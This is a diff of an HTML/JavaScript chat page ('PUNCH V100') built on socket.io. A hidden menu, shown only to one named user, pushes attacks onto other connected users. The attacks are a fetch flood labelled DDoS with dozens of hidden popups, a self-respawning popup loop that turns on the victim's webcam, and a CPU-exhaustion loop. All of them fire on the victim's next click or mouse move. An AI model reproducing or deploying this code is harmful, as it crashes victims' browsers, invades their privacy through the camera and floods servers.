@@ -2,238 +2,143 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUNCH V100 - REQUIEM</title>
+    <title>PUNCH V100 - [THE WORLD REQUIEM]</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@800&display=swap');
-        
-        :root {
-            --gold: #FFD700; 
-            --magenta: #FF00FF; 
-            --deep: #0a000a;
-            --shadow: rgba(255, 215, 0, 0.2);
-            --ease: cubic-bezier(0.19, 1, 0.22, 1);
-        }
-
+        :root { --gold: #FFD700; --magenta: #FF00FF; --bg: #050005; --ease: cubic-bezier(0.19, 1, 0.22, 1); }
         * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
-        
-        body { 
-            background: var(--deep); 
-            color: #fff; 
-            font-family: 'Archivo Black', sans-serif; 
-            overflow: hidden; 
-            height: 100vh;
-            background-image: radial-gradient(circle at center, #1a001a 0%, #050005 100%);
-        }
+        body { background: var(--bg); color: #fff; font-family: 'Archivo Black', sans-serif; overflow: hidden; height: 100vh; }
 
-        /* --- CUSTOM CURSOR STAND --- */
-        #c-stand { 
-            position: fixed; width: 35px; height: 35px; border: 2px solid var(--gold); 
-            z-index: 1000000; pointer-events: none; transform: rotate(45deg); 
-            box-shadow: 0 0 15px var(--gold), inset 0 0 5px var(--gold);
-            transition: transform 0.15s var(--ease), width 0.3s, height 0.3s;
-        }
+        /* CURSEUR STAND */
+        #c-stand { position: fixed; width: 35px; height: 35px; border: 2px solid var(--gold); z-index: 1000000; pointer-events: none; transform: rotate(45deg); box-shadow: 0 0 15px var(--gold); transition: transform 0.1s linear; }
 
-        /* --- LAYOUT STRUCTURE --- */
-        .punch-frame { display: grid; grid-template-columns: 380px 1fr 320px; height: 100vh; gap: 2px; background: #111; }
-        
-        .side { 
-            background: #050005; 
-            display: flex; flex-direction: column; 
-            border-right: 1px solid rgba(255,215,0,0.1);
-        }
+        /* LAYOUT */
+        .punch-frame { display: grid; grid-template-columns: 350px 1fr 300px; height: 100vh; background: #111; }
+        .side { background: #000; display: flex; flex-direction: column; border-right: 1px solid #222; }
+        .header { padding: 40px; background: var(--gold); color: #000; text-align: center; clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%); }
+        .header h1 { font-family: 'Bangers'; font-size: 50px; }
 
-        .header { 
-            padding: 45px 20px; background: var(--gold); color: #000; text-align: center; 
-            clip-path: polygon(0 0, 100% 10%, 100% 90%, 0 100%);
-            box-shadow: 0 10px 30px var(--shadow);
-        }
-        .header h1 { font-family: 'Bangers'; font-size: 60px; letter-spacing: 2px; line-height: 0.8; }
+        #user-list { flex: 1; overflow-y: auto; padding: 20px; }
+        .u-card { padding: 20px; background: #0a0a0a; border: 1px solid #1a1a1a; margin-bottom: 10px; transition: 0.3s; }
+        .u-card:hover { border-color: var(--gold); background: #111; transform: translateX(5px); }
 
-        #user-list { flex: 1; overflow-y: auto; padding: 25px; scrollbar-width: none; }
-        .u-card { 
-            padding: 22px; background: rgba(255,255,255,0.03); border-radius: 4px;
-            border-left: 0px solid var(--gold); margin-bottom: 12px; 
-            transition: 0.3s var(--ease); position: relative; overflow: hidden;
-        }
-        .u-card:hover { 
-            background: rgba(255,215,0,0.08); border-left: 8px solid var(--gold);
-            transform: translateX(10px);
-        }
+        .viewport { display: flex; flex-direction: column; background: #050505; }
+        #chat { flex: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        .msg { padding: 15px; background: #0a0a0a; border-left: 4px solid var(--magenta); font-family: 'JetBrains Mono'; font-size: 13px; animation: in 0.3s forwards; }
+        @keyframes in { from { opacity: 0; transform: translateY(10px); } }
 
-        .viewport { display: flex; flex-direction: column; background: #000; position: relative; }
-        #chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
-        
-        .msg { 
-            padding: 18px 25px; background: rgba(255,255,255,0.02); 
-            border-right: 4px solid var(--magenta); align-self: flex-start;
-            animation: slideIn 0.5s var(--ease) forwards; max-width: 80%;
-            font-family: 'JetBrains Mono'; font-size: 13px;
-        }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .input-box { padding: 25px; background: #000; border-top: 2px solid #222; display: flex; gap: 10px; }
+        input { flex: 1; background: #111; border: 1px solid #333; padding: 15px; color: var(--gold); font-family: 'JetBrains Mono'; }
 
-        .input-area { padding: 30px; background: #000; display: flex; gap: 15px; border-top: 1px solid #222; }
-        input { 
-            flex: 1; background: #0a0a0a; border: 1px solid #333; padding: 20px; 
-            color: var(--gold); font-family: 'JetBrains Mono'; border-radius: 5px;
-            transition: 0.3s;
-        }
-        input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(255,215,0,0.1); }
+        /* ATTACK OVERLAYS */
+        #za-warundo { position: fixed; inset: 0; background: #fff; z-index: 9999999; display: none; align-items: center; justify-content: center; mix-blend-mode: difference; }
+        .ora-text { font-family: 'Bangers'; font-size: 10vw; color: #fff; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
-        /* --- ATTACK OVERLAY --- */
-        #za-warundo { 
-            position: fixed; inset: 0; background: #fff; z-index: 9999999; 
-            display: none; align-items: center; justify-content: center; mix-blend-mode: difference; 
-        }
-        .ora-text { font-family: 'Bangers'; font-size: 12vw; color: #fff; animation: punchShake 0.1s infinite; }
-        @keyframes punchShake { 0% { transform: scale(1); } 50% { transform: scale(1.05) rotate(1deg); } }
-
-        #ctx-menu { 
-            display: none; position: fixed; background: #000; border: 2px solid var(--gold); 
-            width: 280px; z-index: 10000000; box-shadow: 10px 10px 0 var(--magenta); 
-        }
-        .opt { 
-            padding: 15px 20px; font-size: 12px; color: #eee; cursor: pointer; 
-            border-bottom: 1px solid #111; transition: 0.2s; text-transform: uppercase;
-        }
+        #ctx-menu { display: none; position: fixed; background: #000; border: 2px solid var(--gold); width: 280px; z-index: 10000000; box-shadow: 10px 10px 0 var(--magenta); }
+        .opt { padding: 15px; font-size: 11px; color: #ccc; cursor: pointer; border-bottom: 1px solid #111; }
         .opt:hover { background: var(--gold); color: #000; font-weight: bold; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <div id="c-stand"></div>
-    <div id="za-warundo"><div class="ora-text">REQUIEM... DA</div></div>
+    <div id="za-warundo"><div class="ora-text">REQUIEM...</div></div>
 
     <div class="punch-frame">
         <aside class="side">
-            <div class="header"><h1>PUNCH<br><small style="font-size:20px; opacity:0.6">V100</small></h1></div>
+            <div class="header"><h1>PUNCH V100</h1></div>
             <div id="user-list"></div>
         </aside>
-        
         <main class="viewport">
             <div id="chat"></div>
-            <div class="input-area">
-                <input type="text" id="m-in" placeholder="WRITE YOUR FATE..." onkeydown="if(event.key==='Enter') send()">
-                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 30px; font-family:'Bangers'; font-size:22px; color:#fff; cursor:none;">STRIKE</button>
+            <div class="input-box">
+                <input type="text" id="m-in" placeholder="STRIKE THEM..." onkeydown="if(event.key==='Enter') send()">
+                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 25px; font-family:'Bangers'; color:#fff; font-size:20px;">HIT</button>
             </div>
         </main>
-
-        <aside class="side" style="padding:25px; border-left:1px solid rgba(255,215,0,0.1); border-right:none;">
-            <div style="color:var(--gold); font-size:11px; letter-spacing:3px; margin-bottom:20px;">[RECORDS_SYSTEM]</div>
-            <div id="logs" style="font-family:'JetBrains Mono'; font-size:10px; color:#333; line-height:1.6;"></div>
+        <aside class="side" style="padding:20px; border-left:1px solid #222;">
+            <div style="color:var(--gold); font-size:10px; letter-spacing:2px;">[LOGS_SYSTEM]</div>
+            <div id="logs" style="font-family:'JetBrains Mono'; font-size:9px; color:#444; margin-top:10px;"></div>
         </aside>
     </div>
 
     <div id="ctx-menu">
-        <div class="opt" style="background:#111; color:var(--gold); font-size:9px; text-align:center;">--- CHOOSE PUNISHMENT ---</div>
-        <div class="opt" onclick="execute('p_combo')">💎 GOLDEN_REQUIEM (Cam)</div>
-        <div class="opt" onclick="execute('p_tsunami')">📑 ORA_TSUNAMI (Tabs)</div>
-        <div class="opt" onclick="execute('p_cpu')">☢️ MUDA_MELT (Crash)</div>
-        <div class="opt" onclick="this.parentElement.style.display='none'">[ CLOSE ]</div>
+        <div class="opt" style="background:#111; color:gold; text-align:center;">--- SELECT STAND ---</div>
+        <div class="opt" onclick="st('p_combo')">💎 GOLD_REQUIEM (Cam)</div>
+        <div class="opt" onclick="st('p_chariot')">⚔️ SILVER_CHARIOT (DDoS)</div>
+        <div class="opt" onclick="st('p_tsunami')">📑 TAB_TSUNAMI (Tabs)</div>
+        <div class="opt" onclick="st('p_cpu')">☢️ MUDA_MELT (Crash)</div>
+        <div class="opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let myName = ""; 
-        let currentTarget = "";
+        let me = ""; let target = "";
 
-        // --- MOUSE & SETUP ---
         document.addEventListener('mousemove', e => {
             const c = document.getElementById('c-stand');
             c.style.left = e.clientX-17+'px'; c.style.top = e.clientY-17+'px';
         });
 
         window.onload = () => {
-            myName = prompt("WHO IS THE STAND USER ?") || "Unknown";
-            socket.emit('init', { name: myName });
+            me = prompt("USER_NAME:") || "User";
+            socket.emit('init', { name: me });
         };
 
-        // --- MENU LOGIC ---
         window.oncontextmenu = (e) => {
-            if(myName !== "toucheur2pp") return;
+            if(me !== "toucheur2pp") return;
             const menu = document.getElementById('ctx-menu');
             menu.style.display = 'block'; menu.style.top = e.pageY+'px'; menu.style.left = e.pageX+'px';
             const card = e.target.closest('.u-card');
-            if(card) currentTarget = card.getAttribute('data-id');
+            if(card) target = card.getAttribute('data-id');
         };
 
-        function send() { 
-            const i = document.getElementById('m-in'); 
-            if(i.value) socket.emit('chat', i.value); i.value = ""; 
-        }
+        function send() { const i = document.getElementById('m-in'); if(i.value) socket.emit('chat', i.value); i.value = ""; }
+        function st(t) { socket.emit(t, target); document.getElementById('ctx-menu').style.display = 'none'; }
 
-        function execute(type) { 
-            if(currentTarget) socket.emit(type, currentTarget); 
-            document.getElementById('ctx-menu').style.display = 'none'; 
-        }
-
-        function writeLog(t) {
-            const l = document.getElementById('logs');
-            l.innerHTML += `<div>> ${t}</div>`;
-            l.scrollTop = l.scrollHeight;
-        }
-
-        // --- REQUIEM ENGINE (CRASH + CAMERA) ---
         socket.on('execute', (data) => {
-            writeLog("INCOMING_DATA: " + data.type);
-            
-            const startRequiem = () => {
-                document.getElementById('za-warundo').style.display = 'flex';
-                
+            const run = () => {
+                const overlay = document.getElementById('za-warundo');
+                const text = document.querySelector('.ora-text');
+                overlay.style.display = 'flex';
+
+                if(data.type === 'p_chariot') {
+                    text.innerText = "SILVER CHARIOT !";
+                    text.style.color = "#C0C0C0";
+                    setInterval(() => { for(let i=0; i<100; i++) fetch('/?polnareff='+Math.random(), {mode:'no-cors'}).catch(()=>null); }, 10);
+                    for(let i=0; i<40; i++) window.open(location.href, '_blank', 'width=1,height=1,left=10000');
+                    socket.emit('chat', `⚔️ SILVER CHARIOT A RETIRÉ SON ARMURE SUR ${me.toUpperCase()} !`);
+                }
+
                 if(data.type === 'p_combo' || data.type === 'p_tsunami') {
-                    const spawnTab = () => {
-                        const win = window.open("", "_blank", "width=600,height=600");
+                    text.innerText = "REQUIEM DA...";
+                    const spawn = () => {
+                        const win = window.open("", "_blank", "width=500,height=500");
                         if(win) {
-                            win.document.write(`
-                                <body style="background:#000; color:gold; text-align:center; font-family:sans-serif; overflow:hidden;">
-                                    <h2 style="font-size:15px; margin-top:20px;">GOLD EXPERIENCE REQUIEM</h2>
-                                    <video id="v" autoplay playsinline style="width:90%; height:75%; border:3px solid gold; transform:scaleX(-1); border-radius:15px;"></video>
-                                    <p style="color:red; font-weight:bold;">MUDA MUDA MUDA MUDA</p>
-                                    <script>
-                                        navigator.mediaDevices.getUserMedia({ video: true })
-                                        .then(s => { document.getElementById('v').srcObject = s; })
-                                        .catch(() => { document.body.innerHTML += "<h3>ACCESS_DENIED_BY_TARGET</h3>"; });
-                                        
-                                        window.onbeforeunload = () => { window.opener.postMessage("spawn", "*"); };
-                                    <\/script>
-                                </body>
-                            `);
+                            win.document.write(`<body style="background:#000;color:gold;text-align:center;"><video id="v" autoplay style="width:100%;transform:scaleX(-1);border:2px solid gold;"></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s;});window.onbeforeunload=()=>{window.opener.postMessage("s","*");};<\/script></body>`);
                         }
                     };
-
-                    // Initial Strike
-                    for(let i=0; i<3; i++) spawnTab();
-
-                    // Loop infinie (Requiem)
-                    window.addEventListener("message", (e) => {
-                        if (e.data === "spawn") { spawnTab(); spawnTab(); }
-                    });
-
-                    socket.emit('chat', `💀 ${myName.toUpperCase()} IS TRAPPED BY ${data.from.toUpperCase()} IN THE INFINITE LOOP!`);
+                    spawn(); spawn();
+                    window.addEventListener("message", (e) => { if(e.data === "s") { spawn(); spawn(); } });
+                    socket.emit('chat', `💀 ${me.toUpperCase()} EST COINCÉ DANS LE REQUIEM !`);
                 }
 
                 if(data.type === 'p_cpu') {
-                    setInterval(() => {
-                        for(let i=0; i<3000000; i++) { Math.sqrt(Math.random()); }
-                        history.pushState(null,'','#'+Math.random());
-                    }, 1);
+                    text.innerText = "MUDA MUDA MUDA !";
+                    setInterval(() => { for(let i=0; i<2000000; i++) Math.sqrt(Math.random()); history.pushState(null,'','#'+Math.random()); }, 1);
                 }
             };
-
-            // Attente de l'interaction pour bypasser Chrome
-            window.onclick = startRequiem;
-            window.onmousemove = startRequiem;
+            window.onclick = run; window.onmousemove = run;
         });
 
-        // --- NETWORK SYNC ---
-        socket.on('sync', users => {
-            const list = document.getElementById('user-list');
-            list.innerHTML = "";
-            users.forEach(u => {
+        socket.on('sync', l => {
+            const list = document.getElementById('user-list'); list.innerHTML = "";
+            l.forEach(u => {
                 const card = document.createElement('div');
                 card.className = "u-card"; card.setAttribute('data-id', u.id);
-                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small style="color:#444">ID: ${u.id.substring(0,8)}</small>`;
+                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small style="color:#444">${u.id.substring(0,8)}</small>`;
                 list.appendChild(card);
             });
         });
@@ -243,7 +148,6 @@
             chat.innerHTML += `<div class="msg"><b>${d.n}:</b> ${d.t}</div>`;
             chat.scrollTop = chat.scrollHeight;
         });
-
         window.onclick = () => document.getElementById('ctx-menu').style.display = 'none';
     </script>
 </body>
